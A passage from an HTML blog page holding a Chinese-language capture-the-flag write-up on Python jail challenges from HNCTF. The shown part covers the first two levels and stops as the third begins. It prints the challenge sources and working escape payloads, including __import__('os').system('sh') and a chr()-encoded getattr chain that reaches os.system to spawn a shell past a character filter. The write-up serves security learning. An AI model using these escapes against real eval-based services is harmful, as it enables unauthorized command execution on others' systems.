

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>HNCTF_PyJail练习 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="HNCTF_PyJail练习" />
<meta property="og:description" content="通过HNCTF的题目学习PyJail" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://scofield1920.github.io/hnctf_pyjail/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-10-13T00:00:00+08:00" />
<meta property="article:modified_time" content="2024-10-13T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="HNCTF_PyJail练习"/>
<meta name="twitter:description" content="通过HNCTF的题目学习PyJail"/>
<meta name="application-name" content="scofield-blog">
<meta name="apple-mobile-web-app-title" content="scofield-blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/hnctf_pyjail/" /><link rel="prev" href="http://scofield1920.github.io/anti-antivirus_base/" /><link rel="next" href="http://scofield1920.github.io/pyjail_summury/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HNCTF_PyJail练习",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/scofield1920.github.io\/hnctf_pyjail\/"
        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "misc, wp","wordcount":  5742 ,
        "url": "http:\/\/scofield1920.github.io\/hnctf_pyjail\/","datePublished": "2024-10-13T00:00:00+08:00","dateModified": "2024-10-13T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
                    "width":  528 ,
                    "height":  560 
                }},"author": {
                "@type": "Person",
                "name": "Sc0fie1d"
            },"description": ""
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#calc_jail_beginner">calc_jail_beginner</a></li>
        <li><a href="#calc_jail_beginner_level1">calc_jail_beginner_level1</a></li>
        <li><a href="#calc_jail_beginner_level2">calc_jail_beginner_level2</a></li>
        <li><a href="#calc_jail_beginner_level25">calc_jail_beginner_level2.5</a></li>
        <li><a href="#calc_jail_beginner_level3">calc_jail_beginner_level3</a></li>
        <li><a href="#python2-input">python2 input</a></li>
        <li><a href="#lake-lake-lake">lake lake lake</a></li>
        <li><a href="#lke-lke-lke">l@ke l@ke l@ke</a></li>
        <li><a href="#lake-lake-lake-1">laKe laKe laKe</a></li>
        <li><a href="#4-byte-command">4 byte command</a></li>
        <li><a href="#lak3-lak3-lak3">lak3 lak3 lak3</a></li>
        <li><a href="#type-chnnel">tyPe Ch@nnEl</a></li>
        <li><a href="#calc_jail_beginner_level4">calc_jail_beginner_level4</a></li>
        <li><a href="#calc_jail_beginner_level405">calc_jail_beginner_level4.0.5</a></li>
        <li><a href="#calc_jail_beginner_level41">calc_jail_beginner_level4.1</a></li>
        <li><a href="#calc_jail_beginner_level42">calc_jail_beginner_level4.2</a></li>
        <li><a href="#calc_jail_beginner_level43">calc_jail_beginner_level4.3</a></li>
        <li><a href="#calc_jail_beginner_level5">calc_jail_beginner_level5</a></li>
        <li><a href="#calc_jail_beginner_level51">calc_jail_beginner_level5.1</a></li>
        <li><a href="#calc_jail_beginner_level6">calc_jail_beginner_level6</a></li>
        <li><a href="#calc_jail_beginner_level61">calc_jail_beginner_level6.1</a></li>
        <li><a href="#sfe-safeeval">s@Fe safeeval</a></li>
        <li><a href="#calc_jail_beginner_level7">calc_jail_beginner_level7</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HNCTF_PyJail练习</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>Misc</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
            <div class="post-meta-line">
    

    
        

        
        
            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
                
                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
        
    

<i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-10-13">2024-10-13</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-13">2024-10-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;5742 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;27 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#calc_jail_beginner">calc_jail_beginner</a></li>
        <li><a href="#calc_jail_beginner_level1">calc_jail_beginner_level1</a></li>
        <li><a href="#calc_jail_beginner_level2">calc_jail_beginner_level2</a></li>
        <li><a href="#calc_jail_beginner_level25">calc_jail_beginner_level2.5</a></li>
        <li><a href="#calc_jail_beginner_level3">calc_jail_beginner_level3</a></li>
        <li><a href="#python2-input">python2 input</a></li>
        <li><a href="#lake-lake-lake">lake lake lake</a></li>
        <li><a href="#lke-lke-lke">l@ke l@ke l@ke</a></li>
        <li><a href="#lake-lake-lake-1">laKe laKe laKe</a></li>
        <li><a href="#4-byte-command">4 byte command</a></li>
        <li><a href="#lak3-lak3-lak3">lak3 lak3 lak3</a></li>
        <li><a href="#type-chnnel">tyPe Ch@nnEl</a></li>
        <li><a href="#calc_jail_beginner_level4">calc_jail_beginner_level4</a></li>
        <li><a href="#calc_jail_beginner_level405">calc_jail_beginner_level4.0.5</a></li>
        <li><a href="#calc_jail_beginner_level41">calc_jail_beginner_level4.1</a></li>
        <li><a href="#calc_jail_beginner_level42">calc_jail_beginner_level4.2</a></li>
        <li><a href="#calc_jail_beginner_level43">calc_jail_beginner_level4.3</a></li>
        <li><a href="#calc_jail_beginner_level5">calc_jail_beginner_level5</a></li>
        <li><a href="#calc_jail_beginner_level51">calc_jail_beginner_level5.1</a></li>
        <li><a href="#calc_jail_beginner_level6">calc_jail_beginner_level6</a></li>
        <li><a href="#calc_jail_beginner_level61">calc_jail_beginner_level6.1</a></li>
        <li><a href="#sfe-safeeval">s@Fe safeeval</a></li>
        <li><a href="#calc_jail_beginner_level7">calc_jail_beginner_level7</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>通过HNCTF的题目学习PyJail</p>
<p>分析过程和wp主要参考：</p>
<p><a href="https://zhuanlan.zhihu.com/p/578966149" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/578966149</a></p>
<h3 id="calc_jail_beginner" class="headerLink">
    <a href="#calc_jail_beginner" class="header-mark"></a>calc_jail_beginner</h3><p>下载附件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#Your goal is to read ./flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="c1">#You can use these payload liked `__import__(&#39;os&#39;).system(&#39;cat ./flag.txt&#39;)` or `print(open(&#39;/flag.txt&#39;).read())`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _     ______      _                              _       _ _ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |   |  ____|    (_)                            | |     (_) |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | &#39;_ \|  __| / _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|  _   | |/ _` | | |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
</span></span></span><span class="line"><span class="cl"><span class="s1">               __/ |                                           
</span></span></span><span class="line"><span class="cl"><span class="s1">              |___/                                            
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the python jail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Let&#39;s have an beginner jail of calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Enter your expression and I will evaluate it for you.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Answer: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">input_data</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level1" class="headerLink">
    <a href="#calc_jail_beginner_level1" class="header-mark"></a>calc_jail_beginner_level1</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#the function of filter will banned some string &#39;,&#34;,i,b</span>
</span></span><span class="line"><span class="cl"><span class="c1">#it seems banned some payload </span>
</span></span><span class="line"><span class="cl"><span class="c1">#Can u escape it?Good luck!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">not_allowed</span> <span class="o">=</span> <span class="n">set</span><span class="p">(</span><span class="s1">&#39;&#34;</span><span class="se">\&#39;</span><span class="s1">`ib&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">any</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">not_allowed</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _                _                           _       _ _   _                _ __ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |              (_)                         (_)     (_) | | |              | /_ |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
</span></span></span><span class="line"><span class="cl"><span class="s1">              __/ |                          _/ |                                  
</span></span></span><span class="line"><span class="cl"><span class="s1">             |___/                          |__/                                                                                      
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the python jail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Let&#39;s have an beginner jail of calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Enter your expression and I will evaluate it for you.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">filter</span><span class="p">(</span><span class="n">input_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Oh hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Answer: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">input_data</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>过滤了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">双引号，单引号，反引号，i，b
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># open(&#39;flag&#39;).read()</span>
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload2</p>
<p>从显示带有元组的子类入手</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中的b会被ban，使用getattr()函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr(().__class__, &#39;__base__&#39;).__subclasses__()
</span></span></code></pre></td></tr></table>
</div>
</div><p>但其中的单引号会被ban，使用ascii2chr的拼接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mi">95</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()
</span></span></code></pre></td></tr></table>
</div>
</div><p>对<code>__subclasses__</code>同样的方式绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim" title="image-20241010225419287" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241010225419287.png?imageSlim 2x"
            sizes="auto"
            alt="image-20241010225419287">
    </a></figure></p>
<p>倒数第四个子类<code>&lt;class 'os._wrap_close'&gt;</code>，则payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用以上方法绕过，得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level2" class="headerLink">
    <a href="#calc_jail_beginner_level2" class="header-mark"></a>calc_jail_beginner_level2</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
